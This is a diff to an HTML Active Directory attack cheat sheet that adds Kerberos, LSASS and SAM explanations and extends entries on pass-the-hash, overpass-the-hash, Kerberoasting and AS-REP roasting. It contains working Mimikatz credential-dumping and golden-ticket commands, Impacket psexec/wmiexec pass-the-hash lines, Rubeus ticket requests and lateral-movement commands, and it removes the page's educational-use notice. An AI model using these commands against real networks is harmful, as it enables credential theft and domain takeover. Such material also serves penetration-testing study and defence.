@@ -318,9 +318,18 @@
         
         <div class="intro">
             <p>Active Directory (AD) is a critical component of most Windows network environments, but it's also a primary target for attackers. Understanding these attack techniques is essential for both penetration testers and defenders.</p>
-            <p class="warning" style="margin-top: 15px;">Note: This information is for educational and defensive purposes only.</p>
+       
+            
         </div>
-        
+        <section id="ADConcepts">
+        <ui>
+            <p class="subtitle">How Kerberos Authentication Works in AD: </p>
+            <li>When a user logs onto their workstation, their machine will send an <b>AS-REQ message</b> to the Key Distribution Center (KDC), aka Domain Controller, <b>requesting a TGT using a secret key derived from the user’s password.</li>
+            <li>The KDC verifies the secret key with the password it has stored in Active Directory for that user. Once validated, it returns the TGT in an AS-REP message. The TGT contains the user's identity and is encrypted with the KDC secret key (the krbtgt account).                </li>
+            <li>When the user attempts to access a resource backed by Kerberos authentication (e.g. a file share), their machine looks up the associated Service Principal Name (SPN). It then requests (TGS-REQ) a Ticket Granting Service Ticket (TGS) for that service from the KDC, and presents its TGT as a means of proving they're a valid user.</li>
+            <li>The KDC returns a TGS (TGS-REP) for the service in question to the user, which is then presented to the actual service. The service inspects the TGS and decides whether it should grant the user access or not.</li>
+        </ui>
+    </section>
         <!-- Kerberos/AD Concepts Section -->
         <section id="concepts">
             <h2><i class="fas fa-book"></i> Kerberos & Active Directory Concepts</h2>
@@ -384,7 +393,17 @@
                        2. AS-REP: DC returns encrypted TGT<br>
                        3. TGS-REQ: User requests service ticket<br>
                        4. TGS-REP: DC returns service ticket<br>
-                       5. AP-REQ: User presents ticket to service</p>
+                       5. AP-REQ: User presents ticket to service<br> <br>
+                       When a user logs in:<br>
+                       1. User enters credentials<br>
+                       2. LSASS:<br>
+                         - Derives a Kerberos key from the password (or uses cached creds)<br>
+                         - Sends an AS-REQ to the KDC (DC)<br>
+                       3. KDC responds with AS-REP containing a TGT<br>
+                       4. LSASS stores the TGT in memory<br>
+                       👉 The TGT is not stored on disk, it lives in LSASS memory.
+                    </p>
+
                 </div>
                 
                 <div class="concept-card">
@@ -394,6 +413,33 @@
                     </div>
                     <p>The AD database file containing all domain objects, including password hashes. Located on domain controllers at %SystemRoot%\NTDS\NTDS.dit. Often targeted in credential dumping attacks.</p>
                 </div>
+
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-ticket concept-icon"></i>
+                        <span class="acronym">LSASS</span>
+                    </div>
+                    <p>lsass.exe a core Windows security process handles authentication/authorization, for example: verify logged in users activity, handle passwords changes, create access tokens. it holds all the hashes, passwords and tokens across windows domain in memory for the loggedin users. </p>
+                    <br><p>LSASS process part of os and runs as root/authority system</p> <br> <p>Also support in Kerberos tickets granting, When a user logs in, LSASS is the process that actually talks Kerberos to the Domain Controller (KDC).
+                    </p>
+                </div>
+
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-fingerprint concept-icon"></i>
+                        <span class="acronym">SAM</span> - The Security Account Manager 
+                    </div>
+                    <p>(SAM) database holds the NTLM hashes of local accounts only</p>
+                </div>
+
+                <div class="concepts-grid">
+                    <div class="concept-card">
+                        <div class="concept-title">
+                            <i class="fas fa-ticket-alt concept-icon"></i>
+                            <span class="acronym">Delegation</span> 
+                        </div>
+                        <p>Delegation allows a user or machine to act on behalf of another user to another service.  A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database.  The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.</p>
+                    </div> </div>
             </div>
             
             <div class="info-box">
@@ -418,13 +464,13 @@
                 <h3>Mimikatz Commands</h3>
                 
                 <div class="command-box">privilege::debug</div>
-                <div class="command-desc">Enable debug privileges (required for many operations)</div>
+                <div class="command-desc">Enable debug privileges (required for many operations) require system/admin priv</div>
                 
                 <div class="command-box">sekurlsa::logonpasswords</div>
-                <div class="command-desc">Dump credentials from LSASS memory</div>
+                <div class="command-desc">Dump credentials from LSASS process memory of live logged in users to the machine</div>
                 
                 <div class="command-box">lsadump::lsa /patch</div>
-                <div class="command-desc">Extract password hashes from LSASS</div>
+                <div class="command-desc">Extract stored password hashes from LSASS</div>
                 
                 <div class="command-box">kerberos::golden /admin:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt</div>
                 <div class="command-desc">Create Golden Ticket and inject into memory</div>
@@ -741,14 +787,14 @@
                         <div class="section-title">
                             <i class="fas fa-info-circle"></i> Description
                         </div>
-                        <p>Using the NT hash of a user's password (instead of the password itself) to authenticate to a remote system.</p>
+                        <p>(PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash</p>
                     </div>
                     
                     <div class="attack-section">
                         <div class="section-title">
                             <i class="fas fa-clipboard-check"></i> Requirements
                         </div>
-                        <p>User's NT hash, SMB/WinRM access to target, and disabled NTLM restrictions.</p>
+                        <p>User's NT hash, Netowrk access (SMB/WinRM, WMI) to target, and accepts NTLM authentication.</p>
                     </div>
                     
                     <div class="attack-section">
@@ -787,6 +833,14 @@
                             <div class="example-title">Impacket wmiexec:</div>
                             <code>python3 wmiexec.py -hashes :hash domain.local/administrator@10.10.10.10</code>
                         </div>
+                        
+                        <div class="example-box">
+                            <div class="example-title">Impacket psexec:</div>
+                            <code>python3 psexec.py -hashes :2892d26cdf84de jeff@192.x.x.10   #here i will get access as system priv</code>
+                        </div>
+                        <h5 style="color: rgb(136, 137, 148);">how psexec works ? You can see that the psexec module created a randomly-named service executable and after connecting to SLOTH’s ADMIN$ share, drops it to disk and executes it.</h5>
+
+
                     </div>
                     
                     <!-- Added OPSEC Section -->
@@ -797,8 +851,7 @@
                         <div class="opsec-box">
                             <div class="opsec-title">Detection Risks:</div>
                             • Windows event 4624 (logon) with logon type 9 (NewCredentials)<br>
-                            • NTLM authentication logs (event 4776) from unusual sources<br>
-                            • Multiple failed logons followed by success with same hash
+                            • NTLM authentication logs (event 4776) from unusual sources
                         </div>
                         <div class="opsec-box">
                             <div class="opsec-title">Stealth Tips:</div>
@@ -821,7 +874,7 @@
                         <div class="section-title">
                             <i class="fas fa-info-circle"></i> Description
                         </div>
-                        <p>Converting an NT hash into a Kerberos TGT, allowing movement from NTLM to Kerberos authentication.</p>
+                        <p>OPtH use Kerberos TGT, allowing movement from NTLM to Kerberos authentication method.</p>
                     </div>
                     
                     <div class="attack-section">
@@ -861,6 +914,10 @@
                         <div class="example-box">
                             <div class="example-title">Rubeus:</div>
                             <code>Rubeus.exe asktgt /user:Administrator /domain:domain.local /rc4:hash /ptt</code>
+                            <h5 style="color: rgb(136, 137, 148);">To check if TGT is generated and cached in memorey</h5>
+                            <code>klist</code> <br>
+                            <code>Enter-PSSession -ComputerName Juggernaut-DC</code> <br>
+                            <code>dir \\Juggernaut-DC\C$    </code>
                         </div>
                     </div>
                     
@@ -957,7 +1014,6 @@
                             <div class="opsec-title">Detection Risks:</div>
                             • DC event 4769 (service ticket requested) for multiple SPNs<br>
                             • Large number of TGS requests from single user in short time<br>
-                            • Suspicious Kerberos ticket requests (monitored by tools like ATA)
                         </div>
                         <div class="opsec-box">
                             <div class="opsec-title">Stealth Tips:</div>
@@ -980,7 +1036,8 @@
                         <div class="section-title">
                             <i class="fas fa-info-circle"></i> Description
                         </div>
-                        <p>Targeting accounts with "Do not require Kerberos pre-authentication" enabled to request TGTs that can be cracked offline.</p>
+                        <p>Targeting accounts with "Do not require Kerberos pre-authentication" enabled, an AS-REP can be requested for that user throught TGT request, and part of the reply include TGT can be cracked offline to recover plaintext password.</p>
+                        
                     </div>
                     
                     <div class="attack-section">
